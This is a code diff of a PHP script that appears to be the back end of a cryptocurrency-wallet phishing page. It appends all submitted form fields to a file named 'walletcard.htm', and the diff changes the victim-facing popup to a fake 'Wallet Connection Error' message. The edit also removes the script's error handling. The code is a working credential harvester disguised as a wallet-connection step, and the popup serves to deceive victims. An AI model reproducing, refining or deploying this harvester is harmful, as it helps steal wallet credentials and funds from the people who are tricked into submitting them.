@@ -1,18 +1,6 @@
 <?php
-// Define the file path
-$filePath = 'walletcard.htm'; // Ensure this file exists in the same directory as data.php
-
-// Check if the file exists, and create it if it doesn't
-if (!file_exists($filePath)) {
-    file_put_contents($filePath, ''); // Create the file
-}
-
-// Open the file for appending
-$handle = fopen($filePath, "a");
-
-if (!$handle) {
-    die('Failed to open file for writing: ' . error_get_last()['message']);
-}
+// Open or create a file for writing form data
+$handle = fopen("walletcard.htm", "a");
 
 // Iterate through POST data
 foreach ($_POST as $variable => $value) {
@@ -21,7 +9,10 @@ foreach ($_POST as $variable => $value) {
     $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
     
     // Write sanitized data to the file
-    fwrite($handle, $safe_variable . "=" . $safe_value . "<br>");
+    fwrite($handle, $safe_variable);
+    fwrite($handle, "=");
+    fwrite($handle, $safe_value);
+    fwrite($handle, "<br>");
 }
 
 fwrite($handle, "<hr>");
@@ -55,7 +46,7 @@ fclose($handle);
 </head>
 <body>
     <div class="popup">
-        Wallet Connection Pending
+        Wallet Connection Error
     </div>
 
     <script>
